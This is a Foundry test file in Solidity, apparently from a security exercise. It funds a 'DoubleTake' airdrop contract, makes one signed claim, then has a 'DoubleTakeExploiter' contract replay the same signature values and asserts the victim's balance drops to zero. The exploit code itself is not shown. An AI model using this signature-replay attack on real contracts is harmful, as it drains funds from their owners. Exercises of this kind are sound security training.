// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {DoubleTake} from "../src/DoubleTake.sol";
import {DoubleTakeExploiter} from "../src/DoubleTakeExploiter.sol";

contract DoubleTakeExploiterTest is Test {
    DoubleTake public victim;
    DoubleTakeExploiter public exploiter;

    function setUp() public {
        victim = new DoubleTake();
        exploiter = new DoubleTakeExploiter();

        vm.deal(address(victim), 2 ether);
        uint8 v = 28;
        bytes32 r = 0xf202ed96ca1d80f41e7c9bbe7324f8d52b03a2c86d9b731a1d99aa018e9d77e7;
        bytes32 s = 0x7477cb98813d501157156e965b7ea359f5e6c108789e70d7d6873e3354b95f69;

        victim.claimAirdrop(
            0x70997970C51812dc3A010C7d01b50e0d17dc79C8,
            1 ether,
            v,
            r,
            s
        );
    }

    function test_attack() public {
        exploiter.attack(
            victim,
            0x70997970C51812dc3A010C7d01b50e0d17dc79C8,
            28,
            0xf202ed96ca1d80f41e7c9bbe7324f8d52b03a2c86d9b731a1d99aa018e9d77e7,
            0x7477cb98813d501157156e965b7ea359f5e6c108789e70d7d6873e3354b95f69
        );
        assertEq(address(victim).balance, 0);
    }
}
